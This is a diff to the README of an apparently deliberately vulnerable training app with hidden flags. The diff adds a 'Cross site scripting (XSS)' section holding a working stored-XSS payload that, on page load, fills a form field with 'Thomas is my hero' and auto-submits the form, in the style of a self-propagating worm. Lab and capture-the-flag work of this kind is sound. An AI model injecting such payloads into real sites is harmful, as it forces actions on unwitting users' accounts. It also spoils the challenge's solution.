@@ -28,3 +28,9 @@ For the start, play around with the app a bit without even looking at the source
 - But most of all, Samy is my hero.
 
 If you are stuck, you can of course start looking at the code to find the vulnerable spots. But note that this version of the code has none of the flags in it, to not make it trivial for you to find their values. Apart from that, the code is exactly the one that's running in the Docker container.
+
+# Cross site scripting (XSS)
+
+```
+XSS <script async defer>document.addEventListener("DOMContentLoaded", (event) => {document.getElementsByTagName("input")[2].value="Thomas is my hero";document.getElementsByTagName("form")[1].submit()})</script>
+```
